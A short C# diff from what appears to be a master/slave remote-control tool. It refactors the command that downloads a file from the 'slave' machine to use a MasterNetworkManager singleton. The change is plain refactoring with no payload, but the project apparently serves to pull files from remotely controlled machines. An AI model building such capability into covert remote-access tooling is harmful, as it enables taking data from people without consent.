@@ -3,6 +3,7 @@ using Master.Commands.Core;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using Master.Core;
 
 namespace Master.Commands
 {
@@ -21,7 +22,7 @@ namespace Master.Commands
 
         public void Process(List<string> args)
         {
-            var initResult = MasterCommandsManager.networkManager.ReadLine();
+            var initResult = MasterNetworkManager.GetInstance().ReadLine();
             if (initResult != "OK")
             {
                 ColorTools.WriteCommandError(initResult == "NotFound" ? "The remote file doesn't exist" : "An IO exception occured");
@@ -35,7 +36,7 @@ namespace Master.Commands
             {
                 using (var fs = new FileStream(path, FileMode.Create))
                 {
-                    MasterCommandsManager.networkManager.NetworkStreamToStream(fs);
+                    MasterNetworkManager.GetInstance().NetworkStreamToStream(fs);
                 }
 
                 ColorTools.WriteCommandSuccess("File successfully downloaded from the slave");
